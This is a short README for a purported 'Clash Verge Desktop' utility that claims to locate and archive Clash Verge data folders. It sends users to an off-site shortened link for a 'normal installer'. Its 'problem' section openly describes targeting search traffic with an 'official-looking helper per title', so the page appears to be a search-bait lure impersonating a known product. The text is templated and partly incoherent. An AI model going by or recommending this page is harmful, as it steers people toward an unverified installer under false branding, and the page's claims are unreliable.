# Clash Verge Desktop

*Find the Clash Verge folder fast and keep a local spare.*

## About

**Clash Verge Desktop** is a Windows utility. Local Windows and macOS helper for Clash Verge data paths, config and export caches, and export folders.

Patches move Clash Verge data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Locates Clash Verge user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Clash Verge is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
